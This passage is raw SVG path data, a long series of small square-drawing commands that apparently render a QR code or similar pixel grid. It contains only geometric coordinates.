M154,80l2,0 0,2 -2,0 0,-2z M156,80l2,0 0,2 -2,0 0,-2z M10,82l2,0 0,2 -2,0 0,-2z M12,82l2,0 0,2 -2,0 0,-2z M18,82l2,0 0,2 -2,0 0,-2z M22,82l2,0 0,2 -2,0 0,-2z M32,82l2,0 0,2 -2,0 0,-2z M34,82l2,0 0,2 -2,0 0,-2z M36,82l2,0 0,2 -2,0 0,-2z M38,82l2,0 0,2 -2,0 0,-2z M46,82l2,0 0,2 -2,0 0,-2z M50,82l2,0 0,2 -2,0 0,-2z M52,82l2,0 0,2 -2,0 0,-2z M54,82l2,0 0,2 -2,0 0,-2z M60,82l2,0 0,2 -2,0 0,-2z M62,82l2,0 0,2 -2,0 0,-2z M68,82l2,0 0,2 -2,0 0,-2z M70,82l2,0 0,2 -2,0 0,-2z M72,82l2,0 0,2 -2,0 0,-2z M74,82l2,0 0,2 -2,0 0,-2z M82,82l2,0 0,2 -2,0 0,-2z M84,82l2,0 0,2 -2,0 0,-2z M86,82l2,0 0,2 -2,0 0,-2z M94,82l2,0 0,2 -2,0 0,-2z M104,82l2,0 0,2 -2,0 0,-2z M114,82l2,0 0,2 -2,0 0,-2z M116,82l2,0 0,2 -2,0 0,-2z M118,82l2,0 0,2 -2,0 0,-2z M122,82l2,0 0,2 -2,0 0,-2z M128,82l2,0 0,2 -2,0 0,-2z M132,82l2,0 0,2 -2,0 0,-2z M134,82l2,0 0,2 -2,0 0,-2z M136,82l2,0 0,2 -2,0 0,-2z M142,82l2,0 0,2 -2,0 0,-2z M144,82l2,0 0,2 -2,0 0,-2z M154,82l2,0 0,2 -2,0 0,-2z M156,82l2,0 0,2 -2,0 0,-2z M158,82l2,0 0,2 -2,0 0,-2z M10,84l2,0 0,2 -2,0 0,-2z M16,84l2,0 0,2 -2,0 0,-2z M18,84l2,0 0,2 -2,0 0,-2z M20,84l2,0 0,2 -2,0 0,-2z M22,84l2,0 0,2 -2,0 0,-2z M32,84l2,0 0,2 -2,0 0,-2z M34,84l2,0 0,2 -2,0 0,-2z M36,84l2,0 0,2 -2,0 0,-2z M38,84l2,0 0,2 -2,0 0,-2z M40,84l2,0 0,2 -2,0 0,-2z M42,84l2,0 0,2 -2,0 0,-2z M46,84l2,0 0,2 -2,0 0,-2z M48,84l2,0 0,2 -2,0 0,-2z M52,84l2,0 0,2 -2,0 0,-2z M56,84l2,0 0,2 -2,0 0,-2z M68,84l2,0 0,2 -2,0 0,-2z M74,84l2,0 0,2 -2,0 0,-2z M78,84l2,0 0,2 -2,0 0,-2z M100,84l2,0 0,2 -2,0 0,-2z M108,84l2,0 0,2 -2,0 0,-2z M110,84l2,0 0,2 -2,0 0,-2z M120,84l2,0 0,2 -2,0 0,-2z M122,84l2,0 0,2 -2,0 0,-2z M124,84l2,0 0,2 -2,0 0,-2z M128,84l2,0 0,2 -2,0 0,-2z M136,84l2,0 0,2 -2,0 0,-2z M138,84l2,0 0,2 -2,0 0,-2z M140,84l2,0 0,2 -2,0 0,-2z M142,84l2,0 0,2 -2,0 0,-2z M150,84l2,0 0,2 -2,0 0,-2z M158,84l2,0 0,2 -2,0 0,-2z M12,86l2,0 0,2 -2,0 0,-2z M14,86l2,0 0,2 -2,0 0,-2z M18,86l2,0 0,2 -2,0 0,-2z M26,86l2,0 0,2 -2,0 0,-2z M30,86l2,0 0,2 -2,0 0,-2z M42,86l2,0 0,2 -2,0 0,-2z M44,86l2,0 0,2 -2,0 0,-2z M46,86l2,0 0,2 -2,0 0,-2z M50,86l2,0 0,2 -2,0 0,-2z M58,86l2,0 0,2 -2,0 0,-2z M60,86l2,0 0,2 -2,0 0,-2z M62,86l2,0 0,2 -2,0 0,-2z M66,86l2,0 0,2 -2,0 0,-2z M70,86l2,0 0,2 -2,0 0,-2z M72,86l2,0 0,2 -2,0 0,-2z M74,86l2,0 0,2 -2,0 0,-2z M76,86l2,0 0,2 -2,0 0,-2z M84,86l2,0 0,2 -2,0 0,-2z M90,86l2,0 0,2 -2,0 0,-2z M96,86l2,0 0,2 -2,0 0,-2z M98,86l2,0 0,2 -2,0 0,-2z M102,86l2,0 0,2 -2,0 0,-2z M104,86l2,0 0,2 -2,0 0,-2z M108,86l2,0 0,2 -2,0 0,-2z M110,86l2,0 0,2 -2,0 0,-2z M116,86l2,0 0,2 -2,0 0,-2z M120,86l2,0 0,2 -2,0 0,-2z M122,86l2,0 0,2 -2,0 0,-2z M124,86l2,0 0,2 -2,0 0,-2z M136,86l2,0 0,2 -2,0 0,-2z M138,86l2,0 0,2 -2,0 0,-2z M144,86l2,0 0,2 -2,0 0,-2z M148,86l2,0 0,2 -2,0 0,-2z M152,86l2,0 0,2 -2,0 0,-2z M154,86l2,0 0,2 -2,0 0,-2z M156,86l2,0 0,2 -2,0 0,-2z M158,86l2,0 0,2 -2,0 0,-2z M160,86l2,0 0,2 -2,0 0,-2z M10,88l2,0 0,2 -2,0 0,-2z M12,88l2,0 0,2 -2,0 0,-2z M14,88l2,0 0,2 -2,0 0,-2z M16,88l2,0 0,2 -2,0 0,-2z M18,88l2,0 0,2 -2,0 0,-2z M20,88l2,0 0,2 -2,0 0,-2z M24,88l2,0 0,2 -2,0 0,-2z M28,88l2,0 0,2 -2,0 0,-2z M34,88l2,0 0,2 -2,0 0,-2z M36,88l2,0 0,2 -2,0 0,-2z M38,88l2,0 0,2 -2,0 0,-2z M42,88l2,0 0,2 -2,0 0,-2z M44,88l2,0 0,2 -2,0 0,-2z M46,88l2,0 0,2 -2,0 0,-2z M48,88l2,0 0,2 -2,0 0,-2z M52,88l2,0 0,2 -2,0 0,-2z M54,88l2,0 0,2 -2,0 0,-2z M56,88l2,0 0,2 -2,0 0,-2z M68,88l2,0 0,2 -2,0 0,-2z M78,88l2,0 0,2 -2,0 0,-2z M80,88l2,0 0,2 -2,0 0,-2z M88,88l2,0 0,2 -2,0 0,-2z M90,88l2,0 0,2 -2,0 0,-2z M92,88l2,0 0,2 -2,0 0,-2z M94,88l2,0 0,2 -2,0 0,-2z M96,88l2,0 0,2 -2,0 0,-2z M102,88l2,0 0,2 -2,0 0,-2z M106,88l2,0 0,2 -2,0 0,-2z M108,88l2,0 0,2 -2,0 0,-2z M110,88l2,0 0,2 -2,0 0,-2z M116,88l2,0 0,2 -2,0 0,-2z M120,88l2,0 0,2 -2,0 0,-2z M124,88l2,0 0,2 -2,0 0,-2z M126,88l2,0 0,2 -2,0 0,-2z M128,88l2,0 0,2 -2,0 0,-2z M134,88l2,0 0,2 -2,0 0,-2z M136,88l2,0 0,2 -2,0 0,-2z M142,88l2,0 0,2 -2,0 0,-2z M150,88l2,0 0,2 -2,0 0,-2z M156,88l2,0 0,2 -2,0 0,-2z M158,88l2,0 0,2 -2,0 0,-2z M8,90l2,0 0,2 -2,0 0,-2z M12,90l2,0 0,2 -2,0 0,-2z M14,90l2,0 0,2 -2,0 0,-2z M18,90l2,0 0,2 -2,0 0,-2z M24,90l2,0 0,2 -2,0 0,-2z M26,90l2,0 0,2 -2,0 0,-2z M28,90l2,0 0,2 -2,0 0,-2z M32,90l2,0 0,2 -2,0 0,-2z M34,90l2,0 0,2 -2,0 0,-2z M38,90l2,0 0,2 -2,0 0,-2z M42,90l2,0 0,2 -2,0 0,-2z M44,90l2,0 0,2 -2,0 0,-2z M46,90l2,0 0,2 -2,0 0,-2z M48,90l2,0 0,2 -2,0 0,-2z M50,90l2,0 0,2 -2,0 0,-2z M52,90l2,0 0,2 -2,0 0,-2z M54,90l2,0 0,2 -2,0 0,-2z M56,90l2,0 0,2 -2,0 0,-2z M58,90l2,0 0,2 -2,0 0,-2z M62,90l2,0 0,2 -2,0 0,-2z M68,90l2,0 0,2 -2,0 0,-2z M74,90l2,0 0,2 -2,0 0,-2z M76,90l2,0 0,2 -2,0 0,-2z M84,90l2,0 0,2 -2,0 0,-2z M88,90l2,0 0,2 -2,0 0,-2z M92,90l2,0 0,2 -2,0 0,-2z M96,90l2,0 0,2 -2,0 0,-2z M100,90l2,0 0,2 -2,0 0,-2z M102,90l2,0 0,2 -2,0 0,-2z M106,90l2,0 0,2 -2,0 0,-2z M108,90l2,0 0,2 -2,0 0,-2z M110,90l2,0 0,2 -2,0 0,-2z M112,90l2,0 0,2 -2,0 0,-2z M122,90l2,0 0,2 -2,0 0,-2z M126,90l2,0 0,2 -2,0 0,-2z M132,90l2,0 0,2 -2,0 0,-2z M140,90l2,0 0,2 -2,0 0,-2z M146,90l2,0 0,2 -2,0 0,-2z M148,90l2,0 0,2 -2,0 0,-2z M8,92l2,0 0,2 -2,0 0,-2z M14,92l2,0 0,2 -2,0 0,-2z M20,92l2,0 0,2 -2,0 0,-2z M22,92l2,0 0,2 -2,0 0,-2z M24,92l2,0 0,2 -2,0 0,-2z M28,92l2,0 0,2 -2,0 0,-2z M30,92l2,0 0,2 -2,0 0,-2z M32,92l2,0 0,2 -2,0 0,-2z M36,92l2,0 0,2 -2,0 0,-2z M42,92l2,0 0,2 -2,0 0,-2z M44,92l2,0 0,2 -2,0 0,-2z M48,92l2,0 0,2 -2,0 0,-2z M50,92l2,0 0,2 -2,0 0,-2z M54,92l2,0 0,2 -2,0 0,-2z M56,92l2,0 0,2 -2,0 0,-2z M64,92l2,0 0,2 -2,0 0,-2z M70,92l2,0 0,2 -2,0 0,-2z M74,92l2,0 0,2 -2,0 0,-2z M76,92l2,0 0,2 -2,0 0,-2z M82,92l2,0 0,2 -2,0 0,-2z M84,92l2,0 0,2 -2,0 0,-2z M86,92l2,0 0,2 -2,0 0,-2z M90,92l2,0 0,2 -2,0 0,-2z M102,92l2,0 0,2 -2,0 0,-2z M104,92l2,0 0,2 -2,0 0,-2z M108,92l2,0 0,2 -2,0 0,-2z M114,92l2,0 0,2 -2,0 0,-2z M116,92l2,0 0,2 -2,0 0,-2z M118,92l2,0 0,2 -2,0 0,-2z M120,92l2,0 0,2 -2,0 0,-2z M122,92l2,0 0,2 -2,0 0,-2z M130,92l2,0 0,2 -2,0 0,-2z M132,92l2,0 0,2 -2,0 0,-2z M134,92l2,0 0,2 -2,0 0,-2z M136,92l2,0 0,2 -2,0 0,-2z M142,92l2,0 0,2 -2,0 0,-2z M144,92l2,0 0,2 -2,0 0,-2z M146,92l2,0 0,2 -2,0 0,-2z M154,92l2,0 0,2 -2,0 0,-2z M8,94l2,0 0,2 -2,0 0,-2z M10,94l2,0 0,2 -2,0 0,-2z M14,94l2,0 0,2 -2,0 0,-2z M16,94l2,0 0,2 -2,0 0,-2z M18,94l2,0 0,2 -2,0 0,-2z M22,94l2,0 0,2 -2,0 0,-2z M28,94l2,0 0,2 -2,0 0,-2z M30,94l2,0 0,2 -2,0 0,-2z M34,94l2,0 0,2 -2,0 0,-2z M36,94l2,0 0,2 -2,0 0,-2z M38,94l2,0 0,2 -2,0 0,-2z M42,94l2,0 0,2 -2,0 0,-2z M50,94l2,0 0,2 -2,0 0,-2z M52,94l2,0 0,2 -2,0 0,-2z M56,94l2,0 0,2 -2,0 0,-2z M58,94l2,0 0,2 -2,0 0,-2z M60,94l2,0 0,2 -2,0 0,-2z M62,94l2,0 0,2 -2,0 0,-2z M64,94l2,0 0,2 -2,0 0,-2z M66,94l2,0 0,2 -2,0 0,-2z M68,94l2,0 0,2 -2,0 0,-2z M70,94l2,0 0,2 -2,0 0,-2z M74,94l2,0 0,2 -2,0 0,-2z M78,94l2,0 0,2 -2,0 0,-2z M80,94l2,0 0,2 -2,0 0,-2z M82,94l2,0 0,2 -2,0 0,-2z M86,94l2,0 0,2 -2,0 0,-2z M90,94l2,0 0,2 -2,0 0,-2z M108,94l2,0 0,2 -2,0 0,-2z M110,94l2,0 0,2 -2,0 0,-2z M112,94l2,0 0,2 -2,0 0,-2z M114,94l2,0 0,2 -2,0 0,-2z M120,94l2,0 0,2 -2,0 0,-2z M128,94l2,0 0,2 -2,0 0,-2z M132,94l2,0 0,2 -2,0 0,-2z M136,94l2,0 0,2 -2,0 0,-2z M138,94l2,0 0,2 -2,0 0,-2z M142,94l2,0 0,2 -2,0 0,-2z M144,94l2,0 0,2 -2,0 0,-2z M146,94l2,0 0,2 -2,0 0,-2z M148,94l2,0 0,2 -2,0 0,-2z M152,94l2,0 0,2 -2,0 0,-2z M154,94l2,0 0,2 -2,0 0,-2z M160,94l2,0 0,2 -2,0 0,-2z M8,96l2,0 0,2 -2,0 0,-2z M10,96l2,0 0,2 -2,0 0,-2z M14,96l2,0 0,2 -2,0 0,-2z M16,96l2,0 0,2 -2,0 0,-2z M18,96l2,0 0,2 -2,0 0,-2z M20,96l2,0 0,2 -2,0 0,-2z M24,96l2,0 0,2 -2,0 0,-2z M26,96l2,0 0,2 -2,0 0,-2z M28,96l2,0 0,2 -2,0 0,-2z M30,96l2,0 0,2 -2,0 0,-2z M38,96l2,0 0,2 -2,0 0,-2z M40,96l2,0 0,2 -2,0 0,-2z M50,96l2,0 0,2 -2,0 0,-2z M52,96l2,0 0,2 -2,0 0,-2z M58,96l2,0 0,2 -2,0 0,-2z M68,96l2,0 0,2 -2,0 0,-2z M74,96l2,0 0,2 -2,0 0,-2z M78,96l2,0 0,2 -2,0 0,-2z M82,96l2,0 0,2 -2,0 0,-2z M84,96l2,0 0,2 -2,0 0,-2z M88,96l2,0 0,2 -2,0 0,-2z M94,96l2,0 0,2 -2,0 0,-2z M96,96l2,0 0,2 -2,0 0,-2z M98,96l2,0 0,2 -2,0 0,-2z M104,96l2,0 0,2 -2,0 0,-2z M110,96l2,0 0,2 -2,0 0,-2z M112,96l2,0 0,2 -2,0 0,-2z M114,96l2,0 0,2 -2,0 0,-2z M118,96l2,0 0,2 -2,0 0,-2z M122,96l2,0 0,2 -2,0 0,-2z M138,96l2,0 0,2 -2,0 0,-2z M144,96l2,0 0,2 -2,0 0,-2z M146,96l2,0 0,2 -2,0 0,-2z M150,96l2,0 0,2 -2,0 0,-2z M154,96l2,0 0,2 -2,0 0,-2z M156,96l2,0 0,2 -2,0 0,-2z M160,96l2,0 0,2 -2,0 0,-2z M10,98l2,0 0,2 -2,0 0,-2z M12,98l2,0 0,2 -2,0 0,-2z M16,98l2,0 0,2 -2,0 0,-2z M18,98l2,0 0,2 -2,0 0,-2z M22,98l2,0 0,2 -2,0 0,-2z M28,98l2,0 0,2 -2,0 0,-2z M30,98l2,0 0,2 -2,0 0,-2z M32,98l2,0 0,2 -2,0 0,-2z M34,98l2,0 0,2 -2,0 0,-2z M38,98l2,0 0,2 -2,0 0,-2z M40,98l2,0 0,2 -2,0 0,-2z M46,98l2,0 0,2 -2,0 0,-2z M48,98l2,0 0,2 -2,0 0,-2z M50,98l2,0 0,2 -2,0 0,-2z M54,98l2,0 0,2 -2,0 0,-2z M62,98l2,0 0,2 -2,0 0,-2z M64,98l2,0 0,2 -2,0 0,-2z M72,98l2,0 0,2 -2,0 0,-2z M74,98l2,0 0,2 -2,0 0,-2z M76,98l2,0 0,2 -2,0 0,-2z M82,98l2,0 0,2 -2,0 0,-2z M86,98l2,0 0,2 -2,0 0,-2z M88,98l2,0 0,2 -2,0 0,-2z M100,98l2,0 0,2 -2,0 0,-2z M104,98l2,0 0,2 -2,0 0,-2z M108,98l2,0 0,2 -2,0 0,-2z M110,98l2,0 0,2 -2,0 0,-2z M114,98l2,0 0,2 -2,0 0,-2z M116,98l2,0 0,2 -2,0 0,-2z M118,98l2,0 0,2 -2,0 0,-2z M128,98l2,0 0,2 -2,0 0,-2z M134,98l2,0 0,2 -2,0 0,-2z M138,98l2,0 0,2 -2,0 0,-2z M140,98l2,0 0,2 -2,0 0,-2z M142,98l2,0 0,2 -2,0 0,-2z M148,98l2,0 0,2 -2,0 0,-2z M156,98l2,0 0,2 -2,0 0,-2z M158,98l2,0 0,2 -2,0 0,-2z M160,98l2,0 0,2 -2,0 0,-2z M10,100l2,0 0,2 -2,0 0,-2z M14,100l2,0 0,2 -2,0 0,-2z M16,100l2,0 0,2 -2,0 0,-2z M18,100l2,0 0,2 -2,0 0,-2z M20,100l2,0 0,2 -2,0 0,-2z M22,100l2,0 0,2 -2,0 0,-2z M24,100l2,0 0,2 -2,0 0,-2z M34,100l2,0 0,2 -2,0 0,-2z M36,100l2,0 0,2 -2,0 0,-2z M40,100l2,0 0,2 -2,0 0,-2z M42,100l2,0 0,2 -2,0 0,-2z M46,100l2,0 0,2 -2,0 0,-2z M48,100l2,0 0,2 -2,0 0,-2z M50,100l2,0 0,2 -2,0 0,-2z M56,100l2,0 0,2 -2,0 0,-2z M58,100l2,0 0,2 -2,0 0,-2z M60,100l2,0 0,2 -2,0 0,-2z M62,100l2,0 0,2 -2,0 0,-2z M64,100l2,0 0,2 -2,0 0,-2z M66,100l2,0 0,2 -2,0 0,-2z M72,100l2,0 0,2 -2,0 0,-2z M74,100l2,0 0,2 -2,0 0,-2z M78,100l2,0 0,2 -2,0 0,-2z M80,100l2,0 0,2 -2,0 0,-2z M86,100l2,0 0,2 -2,0 0,-2z M94,100l2,0 0,2 -2,0 0,-2z M96,100l2,0 0,2 -2,0 0,-2z M98,100l2,0 0,2 -2,0 0,-2z M100,100l2,0 0,2 -2,0 0,-2z M102,100l2,0 0,2 -2,0 0,-2z M104,100l2,0 0,2 -2,0 0,-2z M106,100l2,0 0,2 -2,0 0,-2z M108,100l2,0 0,2 -2,0 0,-2z M110,100l2,0 0,2 -2,0 0,-2z M118,100l2,0 0,2 -2,0 0,-2z M120,100l2,0 0,2 -2,0 0,-2z M122,100l2,0 0,2 -2,0 0,-2z M128,100l2,0 0,2 -2,0 0,-2z M136,100l2,0 0,2 -2,0 0,-2z M142,100l2,0 0,2 -2,0 0,-2z M144,100l2,0 0,2 -2,0 0,-2z M146,100l2,0 0,2 -2,0 0,-2z M148,100l2,0 0,2 -2,0 0,-2z M150,100l2,0 0,2 -2,0 0,-2z M152,100l2,0 0,2 -2,0 0,-2z M154,100l2,0 0,2 -2,0 0,-2z M158,100l2,0 0,2 -2,0 0,-2z M14,102l2,0 0,2 -2,0 0,-2z M16,102l2,0 0,2 -2,0 0,-2z M24,102l2,0 0,2 -2,0 0,-2z M26,102l2,0 0,2 -2,0 0,-2z M28,102l2,0 0,2 -2,0 0,-2z M36,102l2,0 0,2 -2,0 0,-2z M40,102l2,0 0,2 -2,0 0,-2z M42,102l2,0 0,2 -2,0 0,-2z M44,102l2,0 0,2 -2,0 0,-2z M46,102l2,0 0,2 -2,0 0,-2z M48,102l2,0 0,2 -2,0 0,-2z M50,102l2,0 0,2 -2,0 0,-2z M56,102l2,0 0,2 -2,0 0,-2z M64,102l2,0 0,2 -2,0 0,-2z M68,102l2,0 0,2 -2,0 0,-2z M70,102l2,0 0,2 -2,0 0,-2z M80,102l2,0 0,2 -2,0 0,-2z M90,102l2,0 0,2 -2,0 0,-2z M100,102l2,0 0,2 -2,0 0,-2z M108,102l2,0 0,2 -2,0 0,-2z M112,102l2,0 0,2 -2,0 0,-2z M116,102l2,0 0,2 -2,0 0,-2z M122,102l2,0 0,2 -2,0 0,-2z M124,102l2,0 0,2 -2,0 0,-2z M132,102l2,0 0,2 -2,0 0,-2z M138,102l2,0 0,2 -2,0 0,-2z M140,102l2,0 0,2 -2,0 0,-2z M144,102l2,0 0,2 -2,0 0,-2z M152,102l2,0 0,2 -2,0 0,-2z M158,102l2,0 0,2 -2,0 0,-2z M12,104l2,0 0,2 -2,0 0,-2z M16,104l2,0 0,2 -2,0 0,-2z M20,104l2,0 0,2 -2,0 0,-2z M24,104l2,0 0,2 -2,0 0,-2z M32,104l2,0 0,2 -2,0 0,-2z M38,104l2,0 0,2 -2,0 0,-2z M44,104l2,0 0,2 -2,0 0,-2z M50,104l2,0 0,2 -2,0 0,-2z M54,104l2,0 0,2 -2,0 0,-2z M56,104l2,0 0,2 -2,0 0,-2z M60,104l2,0 0,2 -2,0 0,-2z M64,104l2,0 0,2 -2,0 0,-2z M66,104l2,0 0,2 -2,0 0,-2z M68,104l2,0 0,2 -2,0 0,-2z M70,104l2,0 0,2 -2,0 0,-2z M72,104l2,0 0,2 -2,0 0,-2z M74,104l2,0 0,2 -2,0 0,-2z M78,104l2,0 0,2 -2,0 0,-2z M82,104l2,0 0,2 -2,0 0,-2z M84,104l2,0 0,2 -2,0 0,-2z M86,104l2,0 0,2 -2,0 0,-2z M92,104l2,0 0,2 -2,0 0,-2z M98,104l2,0 0,2 -2,0 0,-2z M100,104l2,0 0,2 -2,0 0,-2z M104,104l2,0 0,2 -2,0 0,-2z M108,104l2,0 0,2 -2,0 0,-2z M112,104l2,0 0,2 -2,0 0,-2z M114,104l2,0 0,2 -2,0 0,-2z M116,104l2,0 0,2 -2,0 0,-2z M118,104l2,0 0,2 -2,0 0,-2z M128,104l2,0 0,2 -2,0 0,-2z M130,104l2,0 0,2 -2,0 0,-2z M132,104l2,0 0,2 -2,0 0,-2z M134,104l2,0 0,2 -2,0 0,-2z M142,104l2,0 0,2 -2,0 0,-2z M144,104l2,0 0,2 -2,0 0,-2z M148,104l2,0 0,2 -2,0 0,-2z M152,104l2,0 0,2 -2,0 0,-2z M156,104l2,0 0,2 -2,0 0,-2z M158,104l2,0 0,2 -2,0 0,-2z M160,104l2,0 0,2 -2,0 0,-2z M8,106l2,0 0,2 -2,0 0,-2z M12,106l2,0 0,2 -2,0 0,-2z M14,106l2,0 0,2 -2,0 0,-2z M16,106l2,0 0,2 -2,0 0,-2z M24,106l2,0 0,2 -2,0 0,-2z M26,106l2,0 0,2 -2,0 0,-2z M34,106l2,0 0,2 -2,0 0,-2z M38,106l2,0 0,2 -2,0 0,-2z M40,106l2,0 0,2 -2,0 0,-2z M42,106l2,0 0,2 -2,0 0,-2z M44,106l2,0 0,2 -2,0 0,-2z M46,106l2,0 0,2 -2,0 0,-2z M48,106l2,0 0,2 -2,0 0,-2z M50,106l2,0 0,2 -2,0 0,-2z M54,106l2,0 0,2 -2,0 0,-2z M56,106l2,0 0,2 -2,0 0,-2z M64,106l2,0 0,2 -2,0 0,-2z M80,106l2,0 0,2 -2,0 0,-2z M84,106l2,0 0,2 -2,0 0,-2z M92,106l2,0 0,2 -2,0 0,-2z M96,106l2,0 0,2 -2,0 0,-2z M98,106l2,0 0,2 -2,0 0,-2z M100,106l2,0 0,2 -2,0 0,-2z M108,106l2,0 0,2 -2,0 0,-2z M110,106l2,0 0,2 -2,0 0,-2z M112,106l2,0 0,2 -2,0 0,-2z M122,106l2,0 0,2 -2,0 0,-2z M126,106l2,0 0,2 -2,0 0,-2z M132,106l2,0 0,2 -2,0 0,-2z M138,106l2,0 0,2 -2,0 0,-2z M140,106l2,0 0,2 -2,0 0,-2z M144,106l2,0 0,2 -2,0 0,-2z M152,106l2,0 0,2 -2,0 0,-2z M8,108l2,0 0,2 -2,0 0,-2z M10,108l2,0 0,2 -2,0 0,-2z M14,108l2,0 0,2 -2,0 0,-2z M16,108l2,0 0,2 -2,0 0,-2z M18,108l2,0 0,2 -2,0 0,-2z M20,108l2,0 0,2 -2,0 0,-2z M22,108l2,0 0,2 -2,0 0,-2z M24,108l2,0 0,2 -2,0 0,-2z M26,108l2,0 0,2 -2,0 0,-2z M28,108l2,0 0,2 -2,0 0,-2z M30,108l2,0 0,2 -2,0 0,-2z M32,108l2,0 0,2 -2,0 0,-2z M34,108l2,0 0,2 -2,0 0,-2z M38,108l2,0 0,2 -2,0 0,-2z M44,108l2,0 0,2 -2,0 0,-2z M46,108l2,0 0,2 -2,0 0,-2z M50,108l2,0 0,2 -2,0 0,-2z M52,108l2,0 0,2 -2,0 0,-2z M54,108l2,0 0,2 -2,0 0,-2z M56,108l2,0 0,2 -2,0 0,-2z M58,108l2,0 0,2 -2,0 0,-2z M60,108l2,0 0,2 -2,0 0,-2z M62,108l2,0 0,2 -2,0 0,-2z M64,108l2,0 0,2 -2,0 0,-2z M72,108l2,0 0,2 -2,0 0,-2z M78,108l2,0 0,2 -2,0 0,-2z M80,108l2,0 0,2 -2,0 0,-2z M86,108l2,0 0,2 -2,0 0,-2z M88,108l2,0 0,2 -2,0 0,-2z M94,108l2,0 0,2 -2,0 0,-2z M96,108l2,0 0,2 -2,0 0,-2z M98,108l2,0 0,2 -2,0 0,-2z M100,108l2,0 0,2 -2,0 0,-2z M102,108l2,0 0,2 -2,0 0,-2z M104,108l2,0 0,2 -2,0 0,-2z M106,108l2,0 0,2 -2,0 0,-2z M108,108l2,0 0,2 -2,0 0,-2z M112,108l2,0 0,2 -2,0 0,-2z M116,108l2,0 0,2 -2,0 0,-2z M122,108l2,0 0,2 -2,0 0,-2z M124,108l2,0 0,2 -2,0 0,-2z M126,108l2,0 0,2 -2,0 0,-2z M134,108l2,0 0,2 -2,0 0,-2z M136,108l2,0 0,2 -2,0 0,-2z M142,108l2,0 0,2 -2,0 0,-2z M144,108l2,0 0,2 -2,0 0,-2z M146,108l2,0 0,2 -2,0 0,-2z M148,108l2,0 0,2 -2,0 0,-2z M150,108l2,0 0,2 -2,0 0,-2z M152,108l2,0 0,2 -2,0 0,-2z M154,108l2,0 0,2 -2,0 0,-2z M160,108l2,0 0,2 -2,0 0,-2z M8,110l2,0 0,2 -2,0 0,-2z M10,110l2,0 0,2 -2,0 0,-2z M18,110l2,0 0,2 -2,0 0,-2z M22,110l2,0 0,2 -2,0 0,-2z M30,110l2,0 0,2 -2,0 0,-2z M34,110l2,0 0,2 -2,0 0,-2z M38,110l2,0 0,2 -2,0 0,-2z M40,110l2,0 0,2 -2,0 0,-2z M42,110l2,0 0,2 -2,0 0,-2z M48,110l2,0 0,2 -2,0 0,-2z M50,110l2,0 0,2 -2,0 0,-2z M60,110l2,0 0,2 -2,0 0,-2z M62,110l2,0 0,2 -2,0 0,-2z M64,110l2,0 0,2 -2,0 0,-2z M68,110l2,0 0,2 -2,0 0,-2z M70,110l2,0 0,2 -2,0 0,-2z M74,110l2,0 0,2 -2,0 0,-2z M78,110l2,0 0,2 -2,0 0,-2z M82,110l2,0 0,2 -2,0 0,-2z M84,110l2,0 0,2 -2,0 0,-2z M86,110l2,0 0,2 -2,0 0,-2z M88,110l2,0 0,2 -2,0 0,-2z M90,110l2,0 0,2 -2,0 0,-2z M96,110l2,0 0,2 -2,0 0,-2z M100,110l2,0 0,2 -2,0 0,-2z M112,110l2,0 0,2 -2,0 0,-2z M114,110l2,0 0,2 -2,0 0,-2z M124,110l2,0 0,2 -2,0 0,-2z M128,110l2,0 0,2 -2,0 0,-2z M130,110l2,0 0,2 -2,0 0,-2z M136,110l2,0 0,2 -2,0 0,-2z M138,110l2,0 0,2 -2,0 0,-2z M140,110l2,0 0,2 -2,0 0,-2z M144,110l2,0 0,2 -2,0 0,-2z M146,110l2,0 0,2 -2,0 0,-2z M148,110l2,0 0,2 -2,0 0,-2z M150,110l2,0 0,2 -2,0 0,-2z M156,110l2,0 0,2 -2,0 0,-2z M8,112l2,0 0,2 -2,0 0,-2z M10,112l2,0 0,2 -2,0 0,-2z M12,112l2,0 0,2 -2,0 0,-2z M14,112l2,0 0,2 -2,0 0,-2z M16,112l2,0 0,2 -2,0 0,-2z M18,112l2,0 0,2 -2,0 0,-2z M20,112l2,0 0,2 -2,0 0,-2z M26,112l2,0 0,2 -2,0 0,-2z M30,112l2,0 0,2 -2,0 0,-2z M38,112l2,0 0,2 -2,0 0,-2z M40,112l2,0 0,2 -2,0 0,-2z M50,112l2,0 0,2 -2,0 0,-2z M52,112l2,0 0,2 -2,0 0,-2z M56,112l2,0 0,2 -2,0 0,-2z M58,112l2,0 0,2 -2,0 0,-2z M64,112l2,0 0,2 -2,0 0,-2z M68,112l2,0 0,2 -2,0 0,-2z M72,112l2,0 0,2 -2,0 0,-2z M74,112l2,0 0,2 -2,0 0,-2z M76,112l2,0 0,2 -2,0 0,-2z M78,112l2,0 0,2 -2,0 0,-2z M80,112l2,0 0,2 -2,0 0,-2z M82,112l2,0 0,2 -2,0 0,-2z M84,112l2,0 0,2 -2,0 0,-2z M88,112l2,0 0,2 -2,0 0,-2z M94,112l2,0 0,2 -2,0 0,-2z M96,112l2,0 0,2 -2,0 0,-2z M98,112l2,0 0,2 -2,0 0,-2z M100,112l2,0 0,2 -2,0 0,-2z M102,112l2,0 0,2 -2,0 0,-2z M104,112l2,0 0,2 -2,0 0,-2z M110,112l2,0 0,2 -2,0 0,-2z M112,112l2,0 0,2 -2,0 0,-2z M114,112l2,0 0,2 -2,0 0,-2z M118,112l2,0 0,2 -2,0 0,-2z M122,112l2,0 0,2 -2,0 0,-2z M130,112l2,0 0,2 -2,0 0,-2z M132,112l2,0 0,2 -2,0 0,-2z M134,112l2,0 0,2 -2,0 0,-2z M136,112l2,0 0,2 -2,0 0,-2z M138,112l2,0 0,2 -2,0 0,-2z M146,112l2,0 0,2 -2,0 0,-2z M152,112l2,0 0,2 -2,0 0,-2z M154,112l2,0 0,2 -2,0 0,-2z M160,112l2,0 0,2 -2,0 0,-2z M10,114l2,0 0,2 -2,0 0,-2z M16,114l2,0 0,2 -2,0 0,-2z M18,114l2,0 0,2 -2,0 0,-2z M26,114l2,0 0,2 -2,0 0,-2z M34,114l2,0 0,2 -2,0 0,-2z M36,114l2,0 0,2 -2,0 0,-2z M38,114l2,0 0,2 -2,0 0,-2z M46,114l2,0 0,2 -2,0 0,-2z M50,114l2,0 0,2 -2,0 0,-2z M52,114l2,0 0,2 -2,0 0,-2z M56,114l2,0 0,2 -2,0 0,-2z M62,114l2,0 0,2 -2,0 0,-2z M74,114l2,0 0,2 -2,0 0,-2z M78,114l2,0 0,2 -2,0 0,-2z M82,114l2,0 0,2 -2,0 0,-2z M84,114l2,0 0,2 -2,0 0,-2z M86,114l2,0 0,2 -2,0 0,-2z M96,114l2,0 0,2 -2,0 0,-2z M102,114l2,0 0,2 -2,0 0,-2z M106,114l2,0 0,2 -2,0 0,-2z 